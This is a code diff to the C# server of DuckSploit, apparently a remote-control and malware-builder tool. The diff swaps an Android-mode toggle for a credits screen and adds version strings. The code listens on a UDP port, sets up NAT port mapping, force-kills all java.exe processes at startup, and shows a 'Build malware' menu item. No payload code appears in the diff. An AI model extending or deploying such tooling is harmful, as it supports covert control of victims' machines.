@@ -23,6 +23,8 @@ namespace DSserver
     class Program
     {
 		public static string public_ipv4 = "undefined";
+		public static string version = "1.1";
+		public static string version_build = "#beta";
 		
 		
 		public static void Download(string url, string outPath)
@@ -231,7 +233,6 @@ namespace DSserver
 			NatUtility.StartDiscovery();
 			
 			exec_cmd("start cmd.exe /c taskkill /IM java.exe /f");
-			bool android = false;
 			bool pro = false;
 			
 			
@@ -242,22 +243,7 @@ namespace DSserver
 			{
 				Directory.CreateDirectory(dir);
 			}
-			
-			string dir2 = userprofile + "\\DuckSploit\\android"; 
-			if (! Directory.Exists(dir2)) 
-			{
-				Directory.CreateDirectory(dir2);
-			}
-			
-			string androidfilepath = userprofile + "\\DuckSploit\\android\\androidmod.txt"; 
-			if (File.Exists(androidfilepath)) 
-			{
-				android = true;
-			}
-			else
-			{
-				android = false;
-			}
+
 			
 			string profilepath = userprofile + "\\DuckSploit\\pro\\pro.txt"; 
 			if (File.Exists(profilepath)) 
@@ -270,14 +256,7 @@ namespace DSserver
 			}
 			
             UDPSocket s = new UDPSocket();
-			if (android == true)
-			{
-				s.Server("0.0.0.0", 45357);
-			}
-			else
-			{
-				s.Server("0.0.0.0", 45358);
-			}
+			s.Server("0.0.0.0", 45358);
 			int a = 0;
 			while(a == 0)
 			{
@@ -290,13 +269,8 @@ namespace DSserver
 				sendmsg("  '88888P8 '88888P' '88888P' dP   'YP '88888P' 88Y888P' dP '88888P' dP   dP   ", "green");
 				sendmsg("                                               88                              ", "green");
 				sendmsg("                                               dP                              ", "green");
-				sendmsg("                            | DuckSploit V1.0.9 |                         ", "green");
-				sendmsg("                              build version: _6                         ", "yellow");
-				
-				if (android == true)
-				{
-					sendmsg("> Android Mode enabled", "red");
-				}
+				sendmsg("                            | DuckSploit V"+version+" |                         ", "green");
+				sendmsg("                              build version: "+version_build+"                         ", "yellow");
 				if (pro == true)
 				{
 					sendmsg("> Pro version", "red");
@@ -308,7 +282,7 @@ namespace DSserver
 				// # Android mod
 				sendmsgnonewline("    [", "yellow");
 				sendmsgnonewline("2", "red");
-				sendmsg("] Toggle android mode", "yellow");
+				sendmsg("] Credits", "yellow");
 				// # Build malware
 				sendmsgnonewline("    [", "yellow");
 				sendmsgnonewline("3", "red");
@@ -417,41 +391,19 @@ namespace DSserver
 				}
 				else if(menu == "2")
 				{
-					int c = 0;
-					a = 1;
-					while (c == 0)
-					{
-						sendmsg("To work with android payload, you must use android mode", "red");
-						Console.WriteLine(" ");
-						sendmsgnonewline("Choose option [", "green");
-						sendmsgnonewline("on", "yellow");
-						sendmsgnonewline(",", "red");
-						sendmsgnonewline("off", "yellow");
-						sendmsgnonewline("]: ", "green");
-				
-						string androidoption = Console.ReadLine();
-						if (androidoption == "on")
-						{
-							string someText = "hello there, nothin' to see here :|";
-							File.WriteAllText(androidfilepath, someText);
-							c = 1;
-						}
-						else if (androidoption == "off")
-						{
-							c = 1;
-							try
-							{
-								File.Delete(androidfilepath);
-							}
-							catch (Exception e)
-							{}
-						}
-						else
-						{
-							Console.Clear();
-							sendmsg("[x] Unknown opion", "red");
-						}
-					}
+					string newline = "\"";
+					sendmsg("DuckSploit Windows (V"+version+" "+version_build, "yellow");
+					sendmsg("Licence: AGPL-3.0 license ", "yellow");
+					sendmsg("Website: https://ducksploit.com/", "yellow");
+					sendmsg("Discord: https://discord.com/invite/sTVWespH4M", "yellow");
+					Console.WriteLine(" ");
+					sendmsg("          CREDITS          ", "yellow");
+					Console.WriteLine(" ");
+					sendmsg("c DuckpvpTeam - 2023", "yellow");
+					Console.WriteLine(" ");
+					sendmsg(@"Developers: 
+	Canarddu38
+	SoulOfDarkness", "yellow");
 				}
 				else if(menu == "3")
 				{
